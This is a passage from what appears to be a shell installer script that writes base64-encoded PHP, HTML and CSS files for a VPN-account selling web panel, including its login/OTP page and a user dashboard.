ZXInLCdvdHAnXS5mb3JFYWNoKG49PnsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0YWItJytuKS5jbGFzc0xpc3QudG9nZ2xlKCdhY3RpdmUnLG49PT10KTsKICAgIGNvbnN0IGI9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J0bicrbi5jaGFyQXQoMCkudG9VcHBlckNhc2UoKStuLnNsaWNlKDEpKTsKICAgIGlmKGIpe2IuY2xhc3NMaXN0LnRvZ2dsZSgnYWN0aXZlJyxuPT09dCk7Yi5zdHlsZS5kaXNwbGF5PShuPT09J290cCcmJnQhPT0nb3RwJyk/J25vbmUnOicnO30KICB9KTsKICBpZih0PT09J290cCcpIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG5PdHAnKS5zdHlsZS5kaXNwbGF5PScnOwp9Cjw/cGhwIGlmKHN0cnBvcygkc3VjY2VzcywnT1RQJykhPT1mYWxzZXx8c3RycG9zKCRzdWNjZXNzLCdBa3VuIGJlcmhhc2lsJykhPT1mYWxzZSk6Pz4Kc2hvd1RhYignb3RwJyk7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG5PdHAnKS5zdHlsZS5kaXNwbGF5PScnOwo8P3BocCBlbmRpZjs/Pgo8P3BocCBpZihzdHJwb3MoJHN1Y2Nlc3MsJ2RpdmVyaWZpa2FzaScpIT09ZmFsc2UpOj8+c2hvd1RhYignbG9naW4nKTs8P3BocCBlbmRpZjs/PgovLyBBdXRvLWZpbGwgT1RQIGVtYWlsIGZyb20gcmVnaXN0ZXIKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlZ0Zvcm0nKT8uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JyxmdW5jdGlvbigpewogIGNvbnN0IGU9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlZ0VtYWlsJykudmFsdWU7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ290cEVtYWlsJykudmFsdWU9ZTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzZW5kRW1haWwnKS52YWx1ZT1lOwp9KTsKPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo=" | base64 -d > "$DIR"/index.php
    # dashboard.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy9pbmNsdWRlcy9jb25maWcucGhwJzsKJHNlc3Npb24gPSByZXF1aXJlTG9naW4oKTsKJGRiID0gZ2V0REIoKTsKCiR1c2VySWQgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokdXNlcm5hbWUgPSAkc2Vzc2lvblsndXNlcm5hbWUnXTsKJHJvbGUgPSAkc2Vzc2lvblsncm9sZSddOwoKLy8gQW1iaWwgZGF0YSB1c2VyIGZyZXNoCiR1ID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsKJHUtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHVzZXIgPSAkdS0+ZmV0Y2goKTsKCi8vIFN0YXRpc3RpawokdG90YWxBa3VuID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgQ09VTlQoKikgRlJPTSB2cG5fYWNjb3VudHMgV0hFUkUgdXNlcl9pZD0/IEFORCBzdGF0dXM9J2FjdGl2ZSciKTsKJHRvdGFsQWt1bi0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkdG90YWxBa3VuID0gJHRvdGFsQWt1bi0+ZmV0Y2hDb2x1bW4oKTsKCiR0b3RhbFRyeCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIENPVU5UKCopIEZST00gdHJhbnNhY3Rpb25zIFdIRVJFIHVzZXJfaWQ9PyIpOwokdG90YWxUcngtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHRvdGFsVHJ4ID0gJHRvdGFsVHJ4LT5mZXRjaENvbHVtbigpOwoKJHRvdGFsVG9wdXAgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBDT0FMRVNDRShTVU0oYW1vdW50KSwwKSBGUk9NIHRyYW5zYWN0aW9ucyBXSEVSRSB1c2VyX2lkPT8gQU5EIHR5cGU9J3RvcHVwJyBBTkQgc3RhdHVzPSdzdWNjZXNzJyIpOwokdG90YWxUb3B1cC0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkdG90YWxUb3B1cCA9ICR0b3RhbFRvcHVwLT5mZXRjaENvbHVtbigpOwoKLy8gQWt1biBha3RpZiB0ZXJiYXJ1CiRha3VucyA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIHZhLiosIHMubmFtYV9zZXJ2ZXIsIHMubG9rYXNpLCBzLmZsYWcgRlJPTSB2cG5fYWNjb3VudHMgdmEgCiAgICBKT0lOIHNlcnZlcnMgcyBPTiB2YS5zZXJ2ZXJfaWQ9cy5pZCAKICAgIFdIRVJFIHZhLnVzZXJfaWQ9PyBBTkQgdmEuc3RhdHVzPSdhY3RpdmUnIE9SREVSIEJZIHZhLmNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1Iik7CiRha3Vucy0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkYWt1bnMgPSAkYWt1bnMtPmZldGNoQWxsKCk7CgovLyBUcmFuc2Frc2kgdGVyYmFydQokdHJ4cyA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB0cmFuc2FjdGlvbnMgV0hFUkUgdXNlcl9pZD0/IE9SREVSIEJZIGNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1Iik7CiR0cnhzLT5leGVjdXRlKFskdXNlcklkXSk7ICR0cnhzID0gJHRyeHMtPmZldGNoQWxsKCk7CgovLyBTZXJ2ZXJzIHVudHVrIG9yZGVyCiRzZXJ2ZXJzID0gJGRiLT5xdWVyeSgiU0VMRUNUICogRlJPTSBzZXJ2ZXJzIFdIRVJFIHN0YXR1cz0ncmVhZHknIE9SREVSIEJZIG5hbWFfc2VydmVyIiktPmZldGNoQWxsKCk7CgokYXBwTmFtZSA9IGdldFNldHRpbmcoJ2FwcF9uYW1lJywnT3JkZXJWUE4nKTsKJGFwcExvZ28gPSBnZXRTZXR0aW5nKCdhcHBfbG9nbycsJ/Cfk7YnKTsKJGNvbnRhY3RXYSA9IGdldFNldHRpbmcoJ2NvbnRhY3Rfd2EnKTsKJGNvbnRhY3RUZyA9IGdldFNldHRpbmcoJ2NvbnRhY3RfdGcnKTsKCi8vIFRyaWFsIHN1ZGFoIGRpcGFrYWkgaGFyaSBpbmk/CiR0cmlhbFVzZWQgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBDT1VOVCgqKSBGUk9NIHZwbl9hY2NvdW50cyBXSEVSRSB1c2VyX2lkPT8gQU5EIGlzX3RyaWFsPTEgQU5EIERBVEUoY3JlYXRlZF9hdCk9Q1VSREFURSgpIik7CiR0cmlhbFVzZWQtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHRyaWFsVXNlZCA9IChpbnQpJHRyaWFsVXNlZC0+ZmV0Y2hDb2x1bW4oKTsKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImlkIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEiPgo8dGl0bGU+PD89JGFwcE5hbWU/PiDigJQgRGFzaGJvYXJkPC90aXRsZT4KPHN0eWxlPgoqe2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9Cjpyb290ey0tYmc6IzA2MGQxYTstLWNhcmQ6IzBkMWIyZTstLWNhcmQyOiMwZjIxMzg7LS1ib3JkZXI6IzFlM2E1ZjstLXRleHQ6I2YxZjVmOTstLW11dGVkOiM0NzU1Njk7LS1ibHVlOiMzYjgyZjY7LS1jeWFuOiMwZWE1ZTk7LS1ncmVlbjojMTBiOTgxOy0tcmVkOiNlZjQ0NDQ7LS15ZWxsb3c6I2Y1OWUwYjstLXB1cnBsZTojOGI1Y2Y2fQpib2R5e2ZvbnQtZmFtaWx5OidTZWdvZSBVSScsc3lzdGVtLXVpLHNhbnMtc2VyaWY7YmFja2dyb3VuZDp2YXIoLS1iZyk7Y29sb3I6dmFyKC0tdGV4dCk7bWluLWhlaWdodDoxMDB2aDtkaXNwbGF5OmZsZXh9CgovKiBTaWRlYmFyICovCi5zaWRlYmFye3dpZHRoOjI0MHB4O21pbi1oZWlnaHQ6MTAwdmg7YmFja2dyb3VuZDpyZ2JhKDEzLDI3LDQ2LC45NSk7Ym9yZGVyLXJpZ2h0OjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3otaW5kZXg6MTAwO3RyYW5zaXRpb246LjNzfQouc2lkZWJhci1sb2dve3BhZGRpbmc6MS4yNXJlbSAxLjVyZW07Ym9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDouNzVyZW19Ci5zaWRlYmFyLWxvZ28gLmljb257Zm9udC1zaXplOjEuNzVyZW07ZmlsdGVyOmRyb3Atc2hhZG93KDAgMCAxMHB4IHZhcigtLWJsdWUpKX0KLnNpZGViYXItbG9nbyBoMXtmb250LXNpemU6MS4xcmVtO2ZvbnQtd2VpZ2h0OjgwMDtiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkZWcsdmFyKC0tYmx1ZSksdmFyKC0tY3lhbikpOy13ZWJraXQtYmFja2dyb3VuZC1jbGlwOnRleHQ7LXdlYmtpdC10ZXh0LWZpbGwtY29sb3I6dHJhbnNwYXJlbnR9Ci5zaWRlYmFyLWxvZ28gcHtmb250LXNpemU6LjdyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbi10b3A6MXB4fQpuYXZ7ZmxleDoxO3BhZGRpbmc6MXJlbSAwO292ZXJmbG93LXk6YXV0b30KLm5hdi1zZWN0aW9ue3BhZGRpbmc6LjI1cmVtIDEuMjVyZW0gLjVyZW07Zm9udC1zaXplOi42NXJlbTtmb250LXdlaWdodDo3MDA7Y29sb3I6IzMzNDE1NTt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7bGV0dGVyLXNwYWNpbmc6LjFlbTttYXJnaW4tdG9wOi41cmVtfQoubmF2LWl0ZW17ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6Ljc1cmVtO3BhZGRpbmc6LjY1cmVtIDEuMjVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO3RleHQtZGVjb3JhdGlvbjpub25lO2ZvbnQtc2l6ZTouODc1cmVtO2ZvbnQtd2VpZ2h0OjUwMDt0cmFuc2l0aW9uOi4xNXM7Y3Vyc29yOnBvaW50ZXI7Ym9yZGVyOm5vbmU7YmFja2dyb3VuZDpub25lO3dpZHRoOjEwMCU7Zm9udC1mYW1pbHk6aW5oZXJpdH0KLm5hdi1pdGVtOmhvdmVyLC5uYXYtaXRlbS5hY3RpdmV7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoOTBkZWcsIzI1NjNlYjE1LHRyYW5zcGFyZW50KTtjb2xvcjp2YXIoLS10ZXh0KTtib3JkZXItbGVmdDozcHggc29saWQgdmFyKC0tYmx1ZSk7cGFkZGluZy1sZWZ0OmNhbGMoMS4yNXJlbSAtIDNweCl9Ci5uYXYtaXRlbSAuaWNvbnt3aWR0aDoyMHB4O3RleHQtYWxpZ246Y2VudGVyO2ZvbnQtc2l6ZToxcmVtfQoubmF2LWJhZGdle21hcmdpbi1sZWZ0OmF1dG87YmFja2dyb3VuZDp2YXIoLS1ibHVlKTtjb2xvcjojZmZmO2ZvbnQtc2l6ZTouNjVyZW07Zm9udC13ZWlnaHQ6NzAwO3BhZGRpbmc6LjE1cmVtIC40NXJlbTtib3JkZXItcmFkaXVzOjk5cHh9Ci5zaWRlYmFyLWZvb3RlcntwYWRkaW5nOjFyZW0gMS4yNXJlbTtib3JkZXItdG9wOjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpfQoudXNlci1jYXJke2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOi43NXJlbX0KLnVzZXItYXZhdGFye3dpZHRoOjM2cHg7aGVpZ2h0OjM2cHg7Ym9yZGVyLXJhZGl1czo1MCU7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLHZhcigtLWJsdWUpLHZhcigtLXB1cnBsZSkpO2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtmb250LXdlaWdodDo3MDA7Zm9udC1zaXplOi45cmVtO2ZsZXgtc2hyaW5rOjB9Ci51c2VyLW5hbWV7Zm9udC1zaXplOi44NXJlbTtmb250LXdlaWdodDo2MDB9Ci51c2VyLXJvbGV7Zm9udC1zaXplOi43cmVtO2NvbG9yOnZhcigtLW11dGVkKX0KCi8qIE1haW4gKi8KLm1haW57ZmxleDoxO21hcmdpbi1sZWZ0OjI0MHB4O21pbi1oZWlnaHQ6MTAwdmg7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbn0KLnRvcGJhcntwYWRkaW5nOi44NzVyZW0gMS41cmVtO2JhY2tncm91bmQ6cmdiYSgxMywyNyw0NiwuOCk7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO2JhY2tkcm9wLWZpbHRlcjpibHVyKDEwcHgpO3Bvc2l0aW9uOnN0aWNreTt0b3A6MDt6LWluZGV4OjUwfQoudG9wYmFyLXRpdGxle2ZvbnQtc2l6ZToxcmVtO2ZvbnQtd2VpZ2h0OjcwMH0KLnNhbGRvLWNoaXB7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6LjVyZW07YmFja2dyb3VuZDp2YXIoLS1jYXJkMik7Ym9yZGVyOjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpO3BhZGRpbmc6LjQ1cmVtIDFyZW07Ym9yZGVyLXJhZGl1czo5OXB4O2ZvbnQtc2l6ZTouODc1cmVtO2ZvbnQtd2VpZ2h0OjcwMDtjb2xvcjp2YXIoLS1ncmVlbil9Ci5jb250ZW50e3BhZGRpbmc6MS41cmVtO2ZsZXg6MX0KCi8qIFN0YXRzIGdyaWQgKi8KLnN0YXRze2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KGF1dG8tZml0LG1pbm1heCgxNjBweCwxZnIpKTtnYXA6MXJlbTttYXJnaW4tYm90dG9tOjEuNXJlbX0KLnN0YXQtY2FyZHtiYWNrZ3JvdW5kOnZhcigtLWNhcmQpO2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjE0cHg7cGFkZGluZzoxLjI1cmVtO3Bvc2l0aW9uOnJlbGF0aXZlO292ZXJmbG93OmhpZGRlbn0KLnN0YXQtY2FyZDo6YmVmb3Jle2NvbnRlbnQ6Jyc7cG9zaXRpb246YWJzb2x1dGU7dG9wOi0zMHB4O3JpZ2h0Oi0zMHB4O3dpZHRoOjgwcHg7aGVpZ2h0OjgwcHg7Ym9yZGVyLXJhZGl1czo1MCU7b3BhY2l0eTouMDh9Ci5zdGF0LWNhcmQuYmx1ZTo6YmVmb3Jle2JhY2tncm91bmQ6dmFyKC0tYmx1ZSl9Ci5zdGF0LWNhcmQuZ3JlZW46OmJlZm9yZXtiYWNrZ3JvdW5kOnZhcigtLWdyZWVuKX0KLnN0YXQtY2FyZC5wdXJwbGU6OmJlZm9yZXtiYWNrZ3JvdW5kOnZhcigtLXB1cnBsZSl9Ci5zdGF0LWNhcmQueWVsbG93OjpiZWZvcmV7YmFja2dyb3VuZDp2YXIoLS15ZWxsb3cpfQouc3RhdC1pY29ue2ZvbnQtc2l6ZToxLjVyZW07bWFyZ2luLWJvdHRvbTouNzVyZW19Ci5zdGF0LXZhbHtmb250LXNpemU6MS41cmVtO2ZvbnQtd2VpZ2h0OjgwMDtsaW5lLWhlaWdodDoxfQouc3RhdC1sYWJlbHtmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW4tdG9wOi4yNXJlbX0KCi8qIENhcmRzICovCi5jYXJke2JhY2tncm91bmQ6dmFyKC0tY2FyZCk7Ym9yZGVyOjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpO2JvcmRlci1yYWRpdXM6MTZweDtvdmVyZmxvdzpoaWRkZW47bWFyZ2luLWJvdHRvbToxLjI1cmVtfQouY2FyZC1oZWFkZXJ7cGFkZGluZzoxcmVtIDEuMjVyZW07Ym9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVufQouY2FyZC10aXRsZXtmb250LXNpemU6LjlyZW07Zm9udC13ZWlnaHQ6NzAwO2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOi41cmVtfQouY2FyZC1ib2R5e3BhZGRpbmc6MS4yNXJlbX0KCi8qIEFrdW4gbGlzdCAqLwouYWt1bi1pdGVte2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOjFyZW07cGFkZGluZzouODc1cmVtO2JhY2tncm91bmQ6dmFyKC0tY2FyZDIpO2JvcmRlci1yYWRpdXM6MTJweDttYXJnaW4tYm90dG9tOi43NXJlbTtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7dHJhbnNpdGlvbjouMnN9Ci5ha3VuLWl0ZW06aG92ZXJ7Ym9yZGVyLWNvbG9yOnZhcigtLWJsdWUpO2JhY2tncm91bmQ6IzBmMjEzOH0KLmFrdW4tYmFkZ2V7cGFkZGluZzouM3JlbSAuN3JlbTtib3JkZXItcmFkaXVzOjZweDtmb250LXNpemU6LjdyZW07Zm9udC13ZWlnaHQ6NzAwO3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZX0KLmJhZGdlLXZtZXNze2JhY2tncm91bmQ6IzFkNGVkODIwO2NvbG9yOiM2MGE1ZmE7Ym9yZGVyOjFweCBzb2xpZCAjMWQ0ZWQ4NDB9Ci5iYWRnZS12bGVzc3tiYWNrZ3JvdW5kOiMwNjVmNDYyMDtjb2xvcjojMzRkMzk5O2JvcmRlcjoxcHggc29saWQgIzA2NWY0NjQwfQouYmFkZ2UtdHJvamFue2JhY2tncm91bmQ6IzdjM2FlZDIwO2NvbG9yOiNhNzhiZmE7Ym9yZGVyOjFweCBzb2xpZCAjN2MzYWVkNDB9Ci5iYWRnZS1zc2h7YmFja2dyb3VuZDojOTI0MDBlMjA7Y29sb3I6I2ZiYmYyNDtib3JkZXI6MXB4IHNvbGlkICM5MjQwMGU0MH0KLmJhZGdlLXRyaWFse2JhY2tncm91bmQ6IzRjMWQ5NTIwO2NvbG9yOiNjNGI1ZmQ7Ym9yZGVyOjFweCBzb2xpZCAjNGMxZDk1NDB9Ci5ha3VuLWluZm97ZmxleDoxO21pbi13aWR0aDowfQouYWt1bi1uYW1le2ZvbnQtc2l6ZTouODc1cmVtO2ZvbnQtd2VpZ2h0OjYwMDt3aGl0ZS1zcGFjZTpub3dyYXA7b3ZlcmZsb3c6aGlkZGVuO3RleHQtb3ZlcmZsb3c6ZWxsaXBzaXN9Ci5ha3VuLW1ldGF7Zm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luLXRvcDouMnJlbX0KLmFrdW4tZXhwe2ZvbnQtc2l6ZTouNzVyZW07bWFyZ2luLWxlZnQ6YXV0bzt3aGl0ZS1zcGFjZTpub3dyYXB9Ci5leHAtb2t7Y29sb3I6dmFyKC0tZ3JlZW4pfQouZXhwLXdhcm57Y29sb3I6dmFyKC0teWVsbG93KX0KLmV4cC1kYW5nZXJ7Y29sb3I6dmFyKC0tcmVkKX0KCi8qIFRyeCAqLwoudHJ4LWl0ZW17ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6Ljg3NXJlbTtwYWRkaW5nOi43NXJlbSAwO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICMwYTE2Mjh9Ci50cngtaXRlbTpsYXN0LWNoaWxke2JvcmRlci1ib3R0b206bm9uZX0KLnRyeC1pY29ue3dpZHRoOjM2cHg7aGVpZ2h0OjM2cHg7Ym9yZGVyLXJhZGl1czo1MCU7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2ZvbnQtc2l6ZTouODc1cmVtO2ZsZXgtc2hyaW5rOjB9Ci50cngtdG9wdXAgLnRyeC1pY29ue2JhY2tncm91bmQ6IzA2NGUzYjIyO2NvbG9yOnZhcigtLWdyZWVuKX0KLnRyeC1vcmRlciAudHJ4LWljb257YmFja2dyb3VuZDojMWQ0ZWQ4MjA7Y29sb3I6dmFyKC0tYmx1ZSl9Ci50cngtaW5mb3tmbGV4OjE7bWluLXdpZHRoOjB9Ci50cngtZGVzY3tmb250LXNpemU6Ljg1cmVtO2ZvbnQtd2VpZ2h0OjUwMDt3aGl0ZS1zcGFjZTpub3dyYXA7b3ZlcmZsb3c6aGlkZGVuO3RleHQtb3ZlcmZsb3c6ZWxsaXBzaXN9Ci50cngtZGF0ZXtmb250LXNpemU6LjcycmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW4tdG9wOi4xNXJlbX0KLnRyeC1hbW91bnR7Zm9udC1zaXplOi44NzVyZW07Zm9udC13ZWlnaHQ6NzAwO3doaXRlLXNwYWNlOm5vd3JhcH0KCi8qIEJ0biAqLwouYnRue2Rpc3BsYXk6aW5saW5lLWZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDouNHJlbTtwYWRkaW5nOi41NXJlbSAxcmVtO2JvcmRlci1yYWRpdXM6OHB4O2ZvbnQtc2l6ZTouOHJlbTtmb250LXdlaWdodDo2MDA7Y3Vyc29yOnBvaW50ZXI7Ym9yZGVyOm5vbmU7Zm9udC1mYW1pbHk6aW5oZXJpdDt0ZXh0LWRlY29yYXRpb246bm9uZTt0cmFuc2l0aW9uOi4yc30KLmJ0bi1wcmltYXJ5e2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjMjU2M2ViLCMwZWE1ZTkpO2NvbG9yOiNmZmZ9Ci5idG4tcHJpbWFyeTpob3ZlcntvcGFjaXR5Oi45O3RyYW5zZm9ybTp0cmFuc2xhdGVZKC0xcHgpfQouYnRuLXNte3BhZGRpbmc6LjM1cmVtIC43NXJlbTtmb250LXNpemU6Ljc1cmVtfQouYnRuLW91dGxpbmV7YmFja2dyb3VuZDp0cmFuc3BhcmVudDtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7Y29sb3I6dmFyKC0tbXV0ZWQpfQouYnRuLW91dGxpbmU6aG92ZXJ7Ym9yZGVyLWNvbG9yOnZhcigtLWJsdWUpO2NvbG9yOnZhcigtLWJsdWUpfQouYnRuLWdyZWVue2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjMDU5NjY5LCMxMGI5ODEpO2NvbG9yOiNmZmZ9Ci5idG4tcmVke2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjZGMyNjI2LCNlZjQ0NDQpO2NvbG9yOiNmZmZ9CgovKiBNb2RhbCAqLwoubW9kYWx7ZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDo5OTk7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7cGFkZGluZzoxcmVtfQoubW9kYWwuc2hvd3tkaXNwbGF5OmZsZXh9Ci5tb2RhbC1iYWNrZHJvcHtwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwuNyk7YmFja2Ryb3AtZmlsdGVyOmJsdXIoNHB4KX0KLm1vZGFsLWJveHtiYWNrZ3JvdW5kOnZhcigtLWNhcmQpO2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjIwcHg7cGFkZGluZzoxLjc1cmVtO3dpZHRoOjEwMCU7bWF4LXdpZHRoOjUwMHB4O3Bvc2l0aW9uOnJlbGF0aXZlO3otaW5kZXg6MTttYXgtaGVpZ2h0Ojkwdmg7b3ZlcmZsb3cteTphdXRvfQoubW9kYWwtdGl0bGV7Zm9udC1zaXplOjFyZW07Zm9udC13ZWlnaHQ6NzAwO21hcmdpbi1ib3R0b206MS4yNXJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDouNXJlbX0KLm1vZGFsLWNsb3Nle3Bvc2l0aW9uOmFic29sdXRlO3RvcDoxcmVtO3JpZ2h0OjFyZW07YmFja2dyb3VuZDpub25lO2JvcmRlcjpub25lO2NvbG9yOnZhcigtLW11dGVkKTtmb250LXNpemU6MS4yNXJlbTtjdXJzb3I6cG9pbnRlcn0KLmZvcm0tZ3JvdXB7bWFyZ2luLWJvdHRvbToxcmVtfQpsYWJlbC5sYmx7ZGlzcGxheTpibG9jaztmb250LXNpemU6Ljc1cmVtO2ZvbnQtd2VpZ2h0OjYwMDtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luLWJvdHRvbTouMzVyZW07dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2xldHRlci1zcGFjaW5nOi4wNWVtfQppbnB1dCxzZWxlY3QsdGV4dGFyZWF7d2lkdGg6MTAwJTtwYWRkaW5nOi42NXJlbSAuODc1cmVtO2JhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7Ym9yZGVyLXJhZGl1czo4cHg7Y29sb3I6dmFyKC0tdGV4dCk7Zm9udC1zaXplOi44NzVyZW07Zm9udC1mYW1pbHk6aW5oZXJpdDtvdXRsaW5lOm5vbmU7dHJhbnNpdGlvbjpib3JkZXIgLjJzfQppbnB1dDpmb2N1cyxzZWxlY3Q6Zm9jdXN7Ym9yZGVyLWNvbG9yOnZhcigtLWJsdWUpfQpzZWxlY3Qgb3B0aW9ue2JhY2tncm91bmQ6IzBkMWIyZX0KCi8qIFByb3RvY29sIHNlbGVjdG9yICovCi5wcm90by1ncmlke2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KDQsMWZyKTtnYXA6LjVyZW07bWFyZ2luOi41cmVtIDB9Ci5wcm90by1idG57cGFkZGluZzouNnJlbTtib3JkZXItcmFkaXVzOjhweDtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7YmFja2dyb3VuZDp2YXIoLS1jYXJkMik7Y29sb3I6dmFyKC0tbXV0ZWQpO2ZvbnQtc2l6ZTouNzVyZW07Zm9udC13ZWlnaHQ6NjAwO2N1cnNvcjpwb2ludGVyO3RleHQtYWxpZ246Y2VudGVyO3RyYW5zaXRpb246LjJzO2ZvbnQtZmFtaWx5OmluaGVyaXR9Ci5wcm90by1idG46aG92ZXIsLnByb3RvLWJ0bi5hY3RpdmV7Ym9yZGVyLWNvbG9yOnZhcigtLWJsdWUpO2NvbG9yOnZhcigtLWJsdWUpO2JhY2tncm91bmQ6IzFkNGVkODE1fQoucHJvdG8tYnRuIC5pY29ue2Rpc3BsYXk6YmxvY2s7Zm9udC1zaXplOjEuMXJlbTttYXJnaW4tYm90dG9tOi4yNXJlbX0KCi8qIFJlc3VsdCBib3ggKi8KLnJlc3VsdC1ib3h7YmFja2dyb3VuZDojMGExNjI4O2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjEwcHg7cGFkZGluZzoxcmVtO21hcmdpbi10b3A6MXJlbTtkaXNwbGF5Om5vbmV9Ci5yZXN1bHQtYm94LnNob3d7ZGlzcGxheTpibG9ja30KLnJlc3VsdC1yb3d7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO2FsaWduLWl0ZW1zOmZsZXgtc3RhcnQ7cGFkZGluZzouNHJlbSAwO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICMxZTI5M2I7Z2FwOjFyZW19Ci5yZXN1bHQtcm93Omxhc3QtY2hpbGR7Ym9yZGVyLWJvdHRvbTpub25lfQoucmVzdWx0LWtleXtmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLW11dGVkKTtmbGV4LXNocmluazowfQoucmVzdWx0LXZhbHtmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLXRleHQpO3dvcmQtYnJlYWs6YnJlYWstYWxsO3RleHQtYWxpZ246cmlnaHR9Ci5saW5rLWJveHtiYWNrZ3JvdW5kOiMwNjBkMWE7Ym9yZGVyOjFweCBzb2